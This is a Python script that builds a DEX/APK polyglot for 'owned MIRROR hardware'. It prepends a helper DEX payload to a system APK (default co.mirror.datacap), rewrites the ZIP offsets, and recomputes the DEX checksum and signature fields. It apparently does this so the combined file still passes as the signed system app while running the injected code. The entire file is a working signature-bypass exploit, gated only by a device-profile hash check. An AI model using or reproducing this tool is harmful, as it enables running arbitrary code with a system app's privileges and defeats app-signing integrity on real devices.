#!/usr/bin/env python3
"""Build a device-profile-guarded DEX/APK polyglot for owned MIRROR hardware."""

from __future__ import annotations

import argparse
import hashlib
import json
import pathlib
import struct
import tempfile
import zipfile
import zlib


CENTRAL_DIRECTORY_HEADER = b"PK\x01\x02"
END_OF_CENTRAL_DIRECTORY = b"PK\x05\x06"


def sha256(path: pathlib.Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as stream:
        for chunk in iter(lambda: stream.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def expected_apk_hash(profile: dict, package_name: str) -> str:
    try:
        return profile["systemApks"][package_name]["sha256"].lower()
    except KeyError as error:
        raise ValueError(f"Package {package_name!r} is not in the device profile") from error


def create_polyglot(dex_path: pathlib.Path, apk_path: pathlib.Path) -> bytes:
    dex = bytearray(dex_path.read_bytes())
    apk = bytearray(apk_path.read_bytes())

    if not dex.startswith(b"dex\n"):
        raise ValueError("Helper payload is not a DEX file")
    if not zipfile.is_zipfile(apk_path):
        raise ValueError("Source system APK is not a valid ZIP/APK")

    eocd = apk.rfind(END_OF_CENTRAL_DIRECTORY)
    if eocd < 0:
        raise ValueError("APK end-of-central-directory record was not found")
    central_directory = struct.unpack_from("<I", apk, eocd + 16)[0]
    struct.pack_into("<I", apk, eocd + 16, central_directory + len(dex))

    position = central_directory
    while position < eocd:
        if apk[position : position + 4] != CENTRAL_DIRECTORY_HEADER:
            raise ValueError(
                f"Unexpected central-directory record at offset {position}"
            )
        local_header = struct.unpack_from("<I", apk, position + 42)[0]
        struct.pack_into("<I", apk, position + 42, local_header + len(dex))
        filename_length, extra_length, comment_length = struct.unpack_from(
            "<HHH", apk, position + 28
        )
        position += 46 + filename_length + extra_length + comment_length

    combined = dex + apk
    struct.pack_into("<I", combined, 32, len(combined))
    combined[12:32] = hashlib.sha1(combined[32:]).digest()
    struct.pack_into("<I", combined, 8, zlib.adler32(combined[12:]) & 0xFFFFFFFF)
    return bytes(combined)


def write_guarded(
    dex_path: pathlib.Path,
    apk_path: pathlib.Path,
    output_path: pathlib.Path,
    profile_path: pathlib.Path,
    package_name: str,
) -> None:
    profile = json.loads(profile_path.read_text(encoding="utf-8"))
    actual_hash = sha256(apk_path)
    expected_hash = expected_apk_hash(profile, package_name)
    if actual_hash != expected_hash:
        raise ValueError(
            "Source APK hash does not match the selected device profile: "
            f"expected {expected_hash}, received {actual_hash}"
        )

    output_path.parent.mkdir(parents=True, exist_ok=True)
    data = create_polyglot(dex_path, apk_path)
    with tempfile.NamedTemporaryFile(
        dir=output_path.parent,
        prefix=output_path.name,
        suffix=".tmp",
        delete=False,
    ) as temporary:
        temporary.write(data)
        temporary_path = pathlib.Path(temporary.name)
    temporary_path.replace(output_path)


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--dex", required=True, type=pathlib.Path)
    parser.add_argument("--apk", required=True, type=pathlib.Path)
    parser.add_argument("--output", required=True, type=pathlib.Path)
    parser.add_argument("--profile", required=True, type=pathlib.Path)
    parser.add_argument("--package", default="co.mirror.datacap")
    args = parser.parse_args()

    write_guarded(args.dex, args.apk, args.output, args.profile, args.package)
    print(f"Generated {args.output} ({sha256(args.output)})")


if __name__ == "__main__":
    main()
